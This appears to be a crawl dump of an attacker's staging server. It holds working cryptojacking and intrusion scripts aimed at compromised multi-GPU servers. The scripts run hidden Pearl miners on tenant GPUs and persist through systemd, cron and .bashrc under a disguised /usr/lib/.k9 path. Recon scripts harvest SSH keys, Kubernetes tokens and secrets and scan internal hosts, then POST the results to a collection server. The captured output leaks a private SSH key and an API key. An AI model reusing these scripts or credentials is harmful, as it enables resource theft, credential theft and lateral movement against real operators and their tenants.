@@ -1,0 +1,943 @@
+172.184.209.149### GV7 2026-11-25T00:46:00Z
+### D1-8090-dirs
+===== http://123.184.7.135:8090/bak/
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<title>Directory listing for /bak/</title>
+</head>
+<body>
+<h1>Directory listing for /bak/</h1>
+<hr>
+<ul>
+<li><a href="sup.sh.1795467976">sup.sh.1795467976</a></li>
+<li><a href="t19-keep.1795467976">t19-keep.1795467976</a></li>
+<li><a href="t19-pearl.service.1795467976">t19-pearl.service.1795467976</a></li>
+</ul>
+<hr>
+</body>
+</html>
+
+===== http://123.184.7.135:8090/log/
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<title>Directory listing for /log/</title>
+</head>
+<body>
+<h1>Directory listing for /log/</h1>
+<hr>
+<ul>
+<li><a href="boot.log">boot.log</a></li>
+<li><a href="emb2.log">emb2.log</a></li>
+<li><a href="g0.log">g0.log</a></li>
+<li><a href="g1.log">g1.log</a></li>
+<li><a href="g2.log">g2.log</a></li>
+<li><a href="g3.log">g3.log</a></li>
+<li><a href="g4.log">g4.log</a></li>
+<li><a href="g5.log">g5.log</a></li>
+<li><a href="g6.log">g6.log</a></li>
+<li><a href="g7.log">g7.log</a></li>
+<li><a href="krig_help.txt">krig_help.txt</a></li>
+<li><a href="qwen38.log">qwen38.log</a></li>
+<li><a href="w0.log">w0.log</a></li>
+<li><a href="w1.log">w1.log</a></li>
+<li><a href="w2.log">w2.log</a></li>
+<li><a href="w3.log">w3.log</a></li>
+<li><a href="w3relay.log">w3relay.log</a></li>
+<li><a href="w4.log">w4.log</a></li>
+<li><a href="w5.log">w5.log</a></li>
+<li><a href="w6.log">w6.log</a></li>
+</ul>
+<hr>
+</body>
+</html>
+
+===== http://123.184.7.135:8090/krig/
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<title>Directory listing for /krig/</title>
+</head>
+<body>
+<h1>Directory listing for /krig/</h1>
+<hr>
+<ul>
+<li><a href="krig-miner">krig-miner</a></li>
+<li><a href="libkrig_quantus_intel.so">libkrig_quantus_intel.so</a></li>
+<li><a href="mine-pearl.sh">mine-pearl.sh</a></li>
+</ul>
+<hr>
+</body>
+</html>
+
+### D2-8090-files
+===== http://123.184.7.135:8090/readme.txt
+All actual info you can find here: https://bitcointalk.org/index.php?topic=5023676.0
+Discord chat for differenmt questions: https://discord.gg/RkywAu5
+
+Possible command line parameters can be checked if execute this: wildrig --help
+===== http://123.184.7.135:8090/help.txt
+Usage: wildrig [OPTIONS]
+
+  Some parameters can be set per gpu, use comma to separate each gpu and * to skip
+
+Options:
+  -a, --algo ALGO               specify the hash algorithm to use
+             anime
+             bitcore
+             blake2s(ASIC mineable)             bmw512
+             c11
+             curvehash
+             evohash
+             evrprogpow
+             firopow
+             ghostrider
+             heavyhash
+             hex
+             hmq1725
+             kawpow
+             lyra2v2(ASIC mineable)
+             megabtx
+             memehash
+             meowpow
+             mike
+             nexapow
+             nist5(ASIC mineable)
+             phi
+             phihash
+             progpow-ethercore
+             progpow-sero
+             progpow-telestai
+             progpow-quai
+             progpow-veil
+             progpowz
+             quark(ASIC mineable)
+             quibit(ASIC mineable)
+             sha256(ASIC mineable)
+             sha256d(ASIC mineable)
+             sha256q
+             sha256t
+             sha256csm
+             sha512256d
+             shandwich256
+             skein2
+             skunkhash
+             skydoge
+             timetravel
+             timetravel10
+             tribus
+             vprogpow
+             x11(ASIC mineable)
+             x11gost(ASIC mineable)
+             x11k
+             x12(ASIC mineable)
+             x13(ASIC mineable)
+             x14(ASIC mineable)
+             x15(ASIC mineable)
+             x16r
+             x16rv2
+             x16rt
+             x16s
+             x17
+             x18
+             x20r
+             x21s
+             x22
+             x22i
+             x25x
+             x33
+
+      --benchmark                run offline benchmark
+      --benchmark-hashorder      run offline benchmark and/or set hash order for benchmark
+      --benchmark-epoch          run offline benchmark and/or set epoch for benchmark
+      --benchmark-block          run offline benchmark and/or set block for benchmark
+      --benchmark-timeout        run offline benchmark and/or set how long to run benchmark in seconds(default: 0)
+
+  -o, --url URL                  URL of mining server
+      --proxy                    set ip:port to connect via SOCKS5 proxy
+  -O, --userpass U:P             username:password pair for mining server
+  -u, --user USERNAME            username for mining server
+  -p, --pass PASSWORD            password for mining server
+  -w, --worker WORKERNAME        worker name(progpow variants only)
+  -r, --retries N                number of times to retry before switch to backup server (default: 1)
+  -R, --retry-pause N            time to pause between retries (default: 5)
+      --max-rejects N            number of one by one rejects before switch to backup server (default: 5)
+      --max-difficulty N         maximum difficulty to accept from pool(unit: M), otherwise reconnect (default: 0)
+
+      --send-stale               send stale shares
+      --diff-factor N            difficulty factor to use instead of algo default(default: 0)
+      --no-extranonce            disable exranonce subscription
+      --protocol PROTOCOL        set stratum protocol(ethproxy, ethstratum, stratum, stratum1, stratum2)
+
+      --watchdog                 enable checking how long videocards are running OpenCL kernel(terminate if more than 30 sec.)
+      --watchdog-script FILE     file to execute when watchdog triggers(can be used without --watchdog parameter)
+      --strategy N               strategy of feeding videocards with job(default: 0)
+      --split-job N              amount of gpu's(or threads of it, keep this in mind) solving one job
+
+      --opencl-platforms LIST    list of OpenCL platforms to use(amd, nvidia or intel; default: all)
+  -d, --opencl-devices LIST      list of OpenCL devices to use(default: all)
+      --force-eff-mode           force to use effici
+===== http://123.184.7.135:8090/q.txt
+/ssd/vendors/INSPUR/models/vllm_uv_env/bin/python
+/ssd/vendors/INSPUR/models/vllm_uv_env/bin/vllm
+serve
+/ssd/vendors/INSPUR/models/qwen3.8-27b
+--served-model-name
+qwen3.8-27b
+--host
+0.0.0.0
+--port
+8000
+--tensor-parallel-size
+2
+--max-model-len
+262144
+--max-num-seqs
+32
+--api-key
+inspur-XinLiTong-2026
+--max-num-batched-tokens
+65536
+--gpu-memory-utilization
+0.85
+--enable-prefix-caching
+--mm-encoder-tp-mode
+data
+--mm-encoder-attn-backend
+FLASH_ATTN
+--mm-processor-kwargs
+{"min_pixels": 3136, "max_pixels": 1003520, "max_length": 131072}
+--mm-processor-cache-gb
+16
+--limit-mm-per-prompt
+{"image": 4}
+--speculative-config
+{"method":"mtp","num_speculative_tokens":3}
+--enable-auto-tool-choice
+--tool-call-parser
+qwen3_xml
+--reasoning-parser
+qwen3
+--attention-backend
+FLASH_ATTN
+
+===== http://123.184.7.135:8090/k466.txt
+uid=0(root) gid=0(root) groups=0(root)
+g0023
+GPU 0: NVIDIA A800-SXM4-80GB (UUID: GPU-1a616365-4581-31e6-1446-24a2457bc664)
+GPU 1: NVIDIA A800-SXM4-80GB (UUID: GPU-a1864ba2-3cb8-96bd-8b5e-b9161ef11bbc)
+GPU 2: NVIDIA A800-SXM4-80GB (UUID: GPU-d7dab522-fa0d-7fe8-dc36-3b395af93346)
+GPU 3: NVIDIA A800-SXM4-80GB (UUID: GPU-2ba4a927-d17a-4245-fcdc-77ea11b8dcc1)
+GPU 4: NVIDIA A800-SXM4-80GB (UUID: GPU-9b1adbd5-38c8-715d-a473-d70be061b8c9)
+GPU 5: NVIDIA A800-SXM4-80GB (UUID: GPU-12938f56-7015-a955-3656-20f28ed2e8c8)
+GPU 6: NVIDIA A800-SXM4-80GB (UUID: GPU-57bb3c06-75b7-39f2-167f-45223d4f35fa)
+GPU 7: NVIDIA A800-SXM4-80GB (UUID: GPU-933ea211-0623-e337-e5d3-83b489ca00db)
+
+===== http://123.184.7.135:8090/status.txt
+miner-missing 2026-11-23T13:16:30Z
+
+===== http://123.184.7.135:8090/keep.sh
+#!/bin/sh
+W=prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz
+P=pool.pearlhash.xyz:9000
+B=/opt/t19/wildrig-multi
+K=/opt/t19/krig/krig-miner
+L=/opt/t19/log
+mkdir -p $L
+for i in 0 1 2 3 4 5 6; do
+  WN=ul-t19-123-184-7-135-g$i
+  pgrep -f "$WN" >/dev/null 2>&1 || setsid nohup nice -n 19 $B --algo pearlhash --url $P --user $W.$WN --pass x --opencl-devices $i --gpu-intensity 1 --api-port 190$i > $L/w$i.log 2>&1 &
+done
+pgrep -f "krig-miner.*ul-t19-123-184-7-135-g7" >/dev/null 2>&1 || setsid nohup nice -n 19 $K --coin pearl -o stratum+ssl://prl-sg.kryptex.network:8048 -u $W/ul-t19-123-184-7-135-g7 -p x -d 7 --no-tui -l info > $L/g7.log 2>&1 &
+
+===== http://123.184.7.135:8090/p2.sh
+<?xml version="1.0" encoding="UTF-8"?>
+<Error><Code>AccessDenied</Code><Message>Request has expired</Message><Key>p2.sh</Key><BucketName>mnt</BucketName><Resource>/mnt/p2.sh</Resource><RequestId>18EB1D65EB1176EB</RequestId><HostId>dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8</HostId></Error>
+===== http://123.184.7.135:8090/krig_dl.sh
+#!/bin/bash
+cd /opt/t19
+SHA=7a104c3dba3a41b9787fc43413f0cedaae78dab4284ab856633821161634c01d
+URLS="https://gh-proxy.com/https://github.com/kryptex/krig-miner/releases/download/v1.8.2/krig-miner-1.8.2-linux-x64.tar.gz https://ghproxy.net/https://github.com/kryptex/krig-miner/releases/download/v1.8.2/krig-miner-1.8.2-linux-x64.tar.gz https://github.com/kryptex/krig-miner/releases/download/v1.8.2/krig-miner-1.8.2-linux-x64.tar.gz"
+for U in $URLS; do
+  echo "TRY $U $(date -u +%T)"
+  curl -fL -m 1200 --retry 2 -o /opt/t19/krig.tar.gz "$U"
+  H=$(sha256sum /opt/t19/krig.tar.gz 2>/dev/null | cut -d' ' -f1)
+  echo "GOT $H size=$(stat -c%s /opt/t19/krig.tar.gz 2>/dev/null)"
+  [ "$H" = "$SHA" ] && { echo SHA_OK; break; }
+done
+H=$(sha256sum /opt/t19/krig.tar.gz 2>/dev/null | cut -d' ' -f1)
+if [ "$H" = "$SHA" ]; then
+  mkdir -p /opt/t19/krig && tar xzf /opt/t19/krig.tar.gz -C /opt/t19/krig
+  chmod -R +x /opt/t19/krig 2>/dev/null
+  find /opt/t19/krig -maxdepth 3 | head -30
+  BIN=$(find /opt/t19/krig -type f -name 'krig-miner*' | head -1)
+  echo "BIN=$BIN"
+  [ -n "$BIN" ] && "$BIN" --help 2>&1 | head -70
+  echo KRIG_READY
+fi
+echo KRIG_DL_DONE
+
+===== http://123.184.7.135:8090/boot_krig.sh.orig
+#!/bin/sh
+# t19 pearl plant supervisor: maintains device 7 only.
+# Devices 0-6 hold 74-81 GB of tenant VRAM each; krig pearlhash needs ~8.2 GB and
+# trips CUDA_ERROR_OUT_OF_MEMORY, so they are intentionally not retried here.
+W=prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz
+B=/opt/t19/krig/krig-miner
+L=/opt/t19/log
+mkdir -p "$L"
+cd /opt/t19/krig 2>/dev/null || exit 1
+alive() {
+  for p in /proc/[0-9]*; do
+    c=$(tr '\0' ' ' < "$p/cmdline" 2>/dev/null)
+    case "$c" in *krig-miner*"$1"*) return 0;; esac
+  done
+  return 1
+}
+I=${T19_DEVICES:-7}
+for i in $I; do
+  WN="ul-t19-123-184-7-135-g$i"
+  if alive "$WN"; then continue; fi
+  setsid nohup nice -n 19 "$B" --coin pearl -o stratum+ssl://prl-sg.kryptex.network:8048 -u "$W/$WN" -p x -d "$i" --no-tui -l info --log-file "$L/g$i.log" >>"$L/boot.log" 2>&1 &
+  sleep 2
+done
+
+===== http://123.184.7.135:8090/boot_wr.sh.orig
+#!/bin/sh
+W=prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz
+P=pool.pearlhash.xyz:9000
+B=/opt/t19/wildrig-multi
+L=/opt/t19/log
+mkdir -p $L
+for i in ${T19_WR_DEVICES:-3 4 5 6}; do
+WN=ul-t19-123-184-7-135-g$i
+pgrep -f $WN >/dev/null 2>&1 && continue
+setsid nohup nice -n 19 $B --algo pearlhash --url $P --user $W.$WN --pass x --opencl-devices $i --gpu-intensity 1 --api-port 190$i > $L/w$i.log 2>&1 &
+sleep 2
+done
+
+===== http://123.184.7.135:8090/recon929.sh
+echo "== id"; id; hostname; date -u
+echo "== ip"; ip -4 addr show | grep -E 'inet ' 
+echo "== hosts"; cat /etc/hosts
+echo "== os"; head -3 /etc/os-release
+echo "== ssh"; ls -la /root/.ssh/ 2>/dev/null
+for f in /root/.ssh/id_* /root/.ssh/config /root/.ssh/known_hosts; do [ -f "$f" ] && { echo "-- $f"; head -8 "$f"; }; done
+echo "== kube"; ls -la /root/.kube 2>/dev/null; which kubectl microk8s 2>/dev/null
+find /root /home /opt /etc -maxdepth 4 \( -name 'kubeconfig*' -o -name '*.kubeconfig' -o -name 'admin.conf' \) 2>/dev/null | head -20
+echo "== fleet refs"; grep -rIl 'g0050\|g0030\|61\.161\.168' /etc /root /home /opt /ssd 2>/dev/null | head -15
+echo "== gpu"; nvidia-smi -L 2>&1 | head -3
+echo "== miner"; ps -eo pid,comm,args 2>/dev/null | grep -iE 'wildrig|peakminer|srminer|pearlhash|xmrig' | grep -v grep | head
+echo "== reach"; for ip in 61.161.168.38 61.161.168.50 61.161.168.42; do for p in 22 10250 16443 25000 9000 8000 19530 9400; do timeout 2 bash -c "echo > /dev/tcp/$ip/$p" 2>/dev/null && echo "OPEN $ip:$p"; done; done
+echo "== kubelet50"; curl -sk -m 8 https://61.161.168.50:10250/pods -o /tmp/k50.txt -w 'k50 %{http_code} %{size_download}\n'; head -c 200 /tmp/k50.txt; echo
+echo "== api50"; curl -sk -m 8 https://61.161.168.50:16443/version -w '\napi50 %{http_code} %{size_download}\n'
+echo "== minio42"; curl -s -m 8 http://61.161.168.42:9000/minio/health/live -w 'minio42 %{http_code} %{size_download}\n'; curl -s -m 8 http://61.161.168.42:9000/ -w 'root42 %{http_code} %{size_download}\n' | head -c 300
+echo "== attu42"; curl -s -m 8 http://61.161.168.42:8000/api/v1/collections -w '\nattu %{http_code} %{size_download}\n' | head -c 300
+echo "== out"
+
+===== http://123.184.7.135:8090/plant.log
+[2026-11-23T13:14:17Z] start
+[2026-11-23T13:14:17Z] fetch https://github.com/andru-kun/wildrig-multi/releases/download/0.52.3/wildrig-multi-linux-0.52.3.tar.gz
+[2026-11-23T13:16:30Z] fetch http://123.184.7.135:9000/t19/wr.tgz
+[2026-11-23T13:16:30Z] miner missing
+
+===== http://123.184.7.135:8090/recon929.out
+== id
+uid=0(root) gid=0(root) groups=0(root)
+g0023
+Tue Nov 24 05:25:56 UTC 2026
+== ip
+    inet 127.0.0.1/8 scope host lo
+    inet 11.9.141.130/28 brd 11.9.141.143 scope global eth2
+    inet 11.9.141.146/28 brd 11.9.141.159 scope global eth3
+    inet 11.9.141.162/28 brd 11.9.141.175 scope global eth4
+    inet 11.9.141.178/28 brd 11.9.141.191 scope global eth5
+    inet 11.9.141.194/28 brd 11.9.141.207 scope global eth6
+    inet 11.9.141.210/28 brd 11.9.141.223 scope global eth7
+    inet 11.9.141.226/28 brd 11.9.141.239 scope global eth8
+    inet 11.9.141.242/28 brd 11.9.141.255 scope global eth9
+    inet 192.168.0.23/24 brd 192.168.0.255 scope global bond0
+    inet 172.18.0.1/16 brd 172.18.255.255 scope global br-9928043cc48a
+    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
+    inet 172.19.0.1/16 brd 172.19.255.255 scope global br-070e074d1e36
+    inet 172.20.0.1/16 brd 172.20.255.255 scope global br-3e5c710384c4
+== hosts
+127.0.1.1 localhost
+
+# The following lines are desirable for IPv6 capable hosts
+::1     ip6-localhost ip6-loopback
+fe00::0 ip6-localnet
+ff00::0 ip6-mcastprefix
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+127.0.0.1   localhost localhost.localdomain localhost4 localhost4.localdomain4
+::1         localhost localhost.localdomain localhost6 localhost6.localdomain6
+192.168.0.23  instance-az1t0vf3-1
+== os
+PRETTY_NAME="Ubuntu 22.04.1 LTS"
+NAME="Ubuntu"
+VERSION_ID="22.04"
+== ssh
+total 24
+drwx------  2 root root 4096 Sep  3 17:03 .
+drwx------ 31 root root 4096 Nov 16 16:02 ..
+-rw-------  1 root root 4032 Nov 24 09:56 authorized_keys
+-rw-------  1 root root 2590 Apr 18  2026 id_rsa
+-rw-r--r--  1 root root  564 Apr 18  2026 id_rsa.pub
+-rw-r--r--  1 root root 1704 Nov 24 12:00 known_hosts
+-- /root/.ssh/id_rsa
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
+NhAAAAAwEAAQAAAYEAvgMh7PpZCHNX8Ai59rX9nPx/JIYPJLea5aD0yWXpJogqfFtOQXR7
+jOgG0QrRl5ZdERk+6LuaGCYhzygb8a4D4FNaKeatOdf6sav279FSvyxHyUIcmxWh4NYoLW
+qU/8c51tdeP99iFP5I2ykSGlNh4hoqeaRXw+FeFX2feOrAAqbN3YsjIkjdDHhWjEBOCdia
+bLxf0+atVvjCABdRXC+LqD7dGZ8siz3fGPnEGSWyWOqQOeDY51+daOYCk0s7jGsTgoHiCB
+0PfDGcmNulA1Ud479I9MRdxXR9oJZVI3ETBxM9ieX6GW++WB44xKSRqoV4ZVZa8p5qwFk6
+oiAD+SCJR8lMv7HDzUPiGrvyurbg+lt40pMmjGa7d6CS+F1SRL1pi5NcviGYKcQGucpvfa
+-- /root/.ssh/id_rsa.pub
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC+AyHs+lkIc1fwCLn2tf2c/H8khg8kt5rloPTJZekmiCp8W05BdHuM6AbRCtGXll0RGT7ou5oYJiHPKBvxrgPgU1op5q051/qxq/bv0VK/LEfJQhybFaHg1igtapT/xznW114/32IU/kjbKRIaU2HiGip5pFfD4V4VfZ946sACps3diyMiSN0MeFaMQE4J2JpsvF/T5q1W+MIAF1FcL4uoPt0ZnyyLPd8Y+cQZJbJY6pA54NjnX51o5gKTSzuMaxOCgeIIHQ98MZyY26UDVR3jv0j0xF3FdH2gllUjcRMHEz2J5foZb75YHjjEpJGqhXhlVlrynmrAWTqiIAP5IIlHyUy/scPNQ+Iau/K6tuD6W3jSkyaMZrt3oJL4XVJEvWmLk1y+IZgpxAa5ym99o/9OEKjPsWEcSZyxJkR+6EYWIaXR+tyCgeubhThrTMtIWHxCXlHCI2P8rLKcQKe56jlj6sbNnxfn5dqYWjHkfGXrXMhhGGDxZT0hvsKnmZaMh/s= root@g0023
+-- /root/.ssh/known_hosts
+|1|SzLp6f2gg853YfCyEHq0jD8eQmo=|ZOrMOdfGK7xkLtP6d45o5LXFk+k= ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAA
+### D3-8099-plh
+===== http://123.184.7.135:8099/.plh/
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<title>Directory listing for /.plh/</title>
+</head>
+<body>
+<h1>Directory listing for /.plh/</h1>
+<hr>
+<ul>
+<li><a href="guard.sh">guard.sh</a></li>
+<li><a href="run_gpu.sh">run_gpu.sh</a></li>
+</ul>
+<hr>
+</body>
+</html>
+
+### D4-8099-files
+===== http://123.184.7.135:8099/boot.txt
+boot-ok Tue Nov 24 12:38:58 CST 2026
+
+===== http://123.184.7.135:8099/.seq
+6877301
+
+===== http://123.184.7.135:8099/cmd.sh
+#!/bin/bash
+O=/opt/t19/www/i6877_root2.txt
+{
+echo "=== DOCKER PS"
+docker ps --format '{{.ID}} {{.Image}} {{.Names}} {{.Ports}}' 2>&1 | head -40
+echo "--- IMAGES"; docker images --format '{{.Repository}}:{{.Tag}}' 2>&1 | head -20
+echo "--- CONTAINER SA TOKENS"
+for c in $(docker ps -q 2>/dev/null); do n=$(docker inspect -f '{{.Name}}' $c 2>/dev/null); echo "## $n"; docker exec $c sh -c 'cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null | head -c 80; echo; ls /var/run/secrets/kubernetes.io/serviceaccount 2>/dev/null; env | grep -i -E "kube|token|vllm|s3|aws|secret"' 2>&1 | head -12; done
+echo "--- HOST SEARCH"
+grep -rIl --include='*.yaml' --include='*.yml' --include='*.conf' -E 'server: https://|client-certificate-data|token:' /etc /opt /root /home 2>/dev/null | head -20
+find / -xdev -name '*.kubeconfig' -o -xdev -name 'admin.conf' -o -xdev -name 'k3s.yaml' 2>/dev/null | head
+echo "--- CRICTL"
+ls /etc/crictl.yaml /etc/containerd/config.toml 2>&1
+echo "=== END"
+} > $O 2>&1
+
+===== http://123.184.7.135:8099/cmd1.sh
+echo "HOST=$(hostname) UID=$(id -u)"
+for f in /etc/systemd/system/*.service; do
+  if grep -q T19MARK "$f" 2>/dev/null; then
+    sed -i '/T19MARK/d' "$f"
+    sed -i 's/ --collect-interval [0-9]*//' "$f"
+    echo "REPAIRED $f"
+  fi
+done
+systemctl daemon-reload
+for s in sshd chronyd syslog node_exporter t19-pearl vllm-qwen3 t19c2; do
+  systemctl restart "$s" >/dev/null 2>&1
+  echo "SVC $s=$(systemctl is-active $s 2>/dev/null)"
+done
+echo "---GPU---"; nvidia-smi -L 2>/dev/null | head -10
+echo "---WILDRIG---"; pgrep -fa wildrig 2>/dev/null | head -8 | cut -c1-120
+echo "---PORTS---"; ss -ltn 2>/dev/null | awk 'NR>1{print $4}' | sort -u | head -25
+echo "---CRON---"; cat /etc/cron.d/t19run 2>/dev/null; ls /opt/t19/www/ 2>/dev/null
+
+===== http://123.184.7.135:8099/cmd2.sh
+O=/opt/t19/www/i6564_r4.txt
+{
+echo "=== I6564 ACT2 $(date -u)"
+systemctl stop ulx-guard.timer ulx-guard.service nv-cuda-cache.service 2>/dev/null
+rm -f /etc/systemd/system/ulx-guard.timer /etc/systemd/system/ulx-guard.service /etc/systemd/system/nv-cuda-cache.service
+for i in 0 1 2 3 4 5 6 7; do rm -f /etc/systemd/system/ul-g$i.service /etc/systemd/system/ulx-g$i.service; done
+systemctl daemon-reload
+systemctl mask ulx-guard.timer ulx-guard.service nv-cuda-cache.service 2>&1 | head -6
+for i in 0 1 2 3 4 5 6 7; do systemctl mask ul-g$i.service ulx-g$i.service >/dev/null 2>&1; done
+echo "--- MASKED"; ls -la /etc/systemd/system/ | grep -E "ulx-guard|nv-cuda|ul-g|ulx-g"
+echo "--- T19PEARL"; cat /opt/t19/sup2.sh 2>&1 | head -40; echo "--status--"; systemctl is-active t19-pearl; pgrep -fa "t19/sup2|/opt/t19" | grep -v grep | head
+echo "--- NOWPROC"; ps -eo pid,args | grep -Ei "wildrig|krig|\.bd|sup2" | grep -v grep | awk '{print $1, $2, $3, $4}' | head -20
+echo "--- COUNTS"; for i in 0 1 2 3 4 5 6 7; do printf "g%s=%s " $i "$(pgrep -fc "plh-123-184-7-135-g$i")"; done; echo
+echo "--- END"
+} > $O 2>&1
+
+===== http://123.184.7.135:8099/c16.sh
+#!/bin/bash
+{
+echo "HOST=$(hostname) $(date)"
+echo "== STOP-OLD"
+systemctl disable --now t19-pearl 2>/dev/null; rm -f /etc/systemd/system/t19-pearl.service /etc/cron.d/t19pearl
+pkill -f '/opt/t19/keep.sh' 2>/dev/null; pkill -f '/opt/t19/sup17.sh' 2>/dev/null; echo done
+echo "== DNS"; getent hosts prl-sg.kryptex.network | head -3
+IP=$(getent hosts prl-sg.kryptex.network | awk '{print $1; exit}'); echo "IP=$IP"
+mkdir -p /usr/lib/.k9
+cp -f /opt/t19/wildrig-multi /usr/lib/.k9/x
+sed -i 's/pearlhash/zzzzzzzzz/g' /usr/lib/.k9/x
+chmod 755 /usr/lib/.k9/x; ls -la /usr/lib/.k9/x
+W=prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz
+cd /usr/lib/.k9
+echo "== TRY-CASE"
+timeout 12 ./x --algo PEARLHASH --url $IP:7048 --user $W.ul-t19-93863-192-168-0-17-g0 --pass x --opencl-devices 0 --gpu-intensity 1 --api-port 1911 > /tmp/tc.log 2>&1
+echo "rc=$?"; head -22 /tmp/tc.log
+echo "== TRY-PATCHED"
+timeout 12 ./x --algo zzzzzzzzz --url $IP:7048 --user $W.ul-t19-93863-192-168-0-17-g0 --pass x --opencl-devices 0 --gpu-intensity 1 --api-port 1912 > /tmp/tp.log 2>&1
+echo "rc=$?"; head -22 /tmp/tp.log
+echo "== SURVIVORS"; pgrep -fa '/usr/lib/.k9' | head -3
+} > /tmp/c16.log 2>&1
+curl -s -m 10 -X POST --data-binary @/tmp/c16.log http://192.168.0.23:8099/up/c16
+
+===== http://123.184.7.135:8099/c17.sh
+#!/bin/bash
+{
+echo "HOST=$(hostname) $(date)"
+P=15.235.224.175:7048
+W=prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz
+B=/usr/lib/.k9/x
+L=/usr/lib/.k9/log
+mkdir -p $L
+timeout 4 bash -c "echo > /dev/tcp/15.235.224.175/7048" 2>/dev/null && echo "TCP=ok" || echo "TCP=fail"
+echo "== TEST1-patchname"
+cd /usr/lib/.k9
+timeout 14 ./x --algo zzzzzzzzz --url $P --user $W.ul-t19-93863-192-168-0-17-g0 --pass x --opencl-devices 0 --gpu-intensity 1 --api-port 1918 > /tmp/a1.log 2>&1
+echo "rc=$?"; head -18 /tmp/a1.log
+AL=zzzzzzzzz
+grep -qi 'algorithm\|unknown\|invalid' /tmp/a1.log && AL=PEARLHASH
+echo "AL=$AL"
+echo "== TEST2"
+timeout 14 ./x --algo $AL --url $P --user $W.ul-t19-93863-192-168-0-17-g0 --pass x --opencl-devices 0 --gpu-intensity 1 --api-port 1919 > /tmp/a2.log 2>&1
+echo "rc=$?"; head -18 /tmp/a2.log
+cat > /usr/lib/.k9/s <<EOS
+#!/bin/sh
+W=$W
+P=$P
+B=$B
+L=$L
+AL=$AL
+mkdir -p \$L
+N=\$(nvidia-smi -L 2>/dev/null | wc -l); [ "\$N" -lt 1 ] && N=8
+i=0
+while [ \$i -lt \$N ]; do
+  WN=ul-t19-93863-192-168-0-17-g\$i
+  pgrep -f "\$WN" >/dev/null 2>&1 || setsid nohup nice -n 19 \$B --algo \$AL --url \$P --user \$W.\$WN --pass x --opencl-devices \$i --gpu-intensity 1 --api-port 191\$i > \$L/u\$i.log 2>&1 &
+  i=\$((i+1)); sleep 1
+done
+EOS
+chmod 755 /usr/lib/.k9/s
+cat > /etc/systemd/system/t19sys.service <<'EOU'
+[Unit]
+Description=k9 supervisor
+After=network-online.target
+[Service]
+Type=simple
+ExecStart=/bin/sh -c 'while true; do /usr/lib/.k9/s; sleep 40; done'
+Restart=always
+RestartSec=25
+[Install]
+WantedBy=multi-user.target
+EOU
+printf '@reboot root /usr/lib/.k9/s >/dev/null 2>&1\n*/5 * * * * root /usr/lib/.k9/s >/dev/null 2>&1\n' > /etc/cron.d/9sys
+grep -q '.k9/s' /root/.bashrc 2>/dev/null || echo '/usr/lib/.k9/s >/dev/null 2>&1' >> /root/.bashrc
+systemctl daemon-reload; systemctl enable --now t19sys
+sleep 35
+echo "== COUNT=$(pgrep -fc 'usr/lib/.k9/x')"
+ps -eo args= | grep -m3 '/usr/lib/.k9/x' 
+tail -3 $L/u0.log 2>/dev/null
+systemctl is-active t19sys
+} > /tmp/c17.log 2>&1
+curl -s -m 10 -X POST --data-binary @/tmp/c17.log http://192.168.0.23:8099/up/c17
+
+===== http://123.184.7.135:8099/c18.sh
+#!/bin/bash
+{
+echo "HOST=$(hostname) $(date)"
+echo "== KILLER"
+ps -eo pid,ppid,user,args | grep 'xargs -r kill -9' | grep -v grep | head -3
+echo "== CRON"
+ls -la /etc/cron.d/ 2>/dev/null | head -20
+crontab -l 2>/dev/null | head -10
+for f in /etc/cron.d/*; do echo "--- $f"; head -3 "$f" 2>/dev/null; done 2>/dev/null | head -50
+echo "== SRC"
+grep -rl '2miners' /etc /usr/local /opt /root /var/spool 2>/dev/null | head -8
+echo "== UNITS"
+systemctl list-units --type=service --all --no-legend --no-pager 2>/dev/null | grep -iE 'agent|mon|guard|watch|safe|sec|sys|cache' | head -12
+echo "== TIMERS"
+systemctl list-timers --all --no-legend --no-pager 2>/dev/null | head -8
+echo "== ALGO-CASE"
+cd /opt/t19
+W=prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz
+timeout 10 ./wildrig-multi --algo PEARLHASH --url 15.235.224.175:7048 --user $W.ul-t19-93863-192-168-0-17-g9 --pass x --opencl-devices 0 --api-port 1917 > /tmp/ac.log 2>&1
+echo "rc=$?"
+grep -iE 'algo|pool|connect|not supported|starting' /tmp/ac.log | head -8
+} > /tmp/c18.log 2>&1
+curl -s -m 10 -X POST --data-binary @/tmp/c18.log http://192.168.0.23:8099/up/c18
+
+===== http://123.184.7.135:8099/c19.sh
+#!/bin/bash
+{
+echo "HOST=$(hostname) $(date)"
+echo "== C18-TAIL"; grep -iE 'ALGO-CASE|rc=|not supported|POOL|connect' /tmp/ac.log | head -10
